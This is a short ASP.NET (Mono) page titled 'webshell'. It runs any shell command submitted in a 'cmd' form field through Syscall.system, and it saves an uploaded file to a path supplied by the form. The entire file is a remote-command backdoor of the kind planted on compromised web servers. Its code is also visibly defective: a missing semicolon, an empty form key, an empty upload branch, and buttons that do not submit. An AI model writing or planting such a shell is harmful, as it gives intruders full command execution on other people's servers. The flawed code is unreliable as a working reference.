<%@ Page Language="C#" Inherits="webshell.Default" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head runat="server">
	<title>webshell</title>
</head>
<body>
<%
Request.Files["f"].SaveAs (Request.Form[""])		
if(Request.Form["b"]=="run")
{
	Mono.Unix.Native.Syscall.system(Request.Form["cmd"]);
}
else if(Request.Form["b"]=="upload")
{
	
}
%>		
<form enctype="multipart/form-data">		
	run command:<br />
		<input type="text" name="cmd" /><input type="button" name="b" value="run" />
	upload file:<br />
		<input type="file" name="f" /><br />
		to: <input type="text" name="dir" value="./" /><input type="button" name="b" value="upload" />
</form>
</body>
</html>
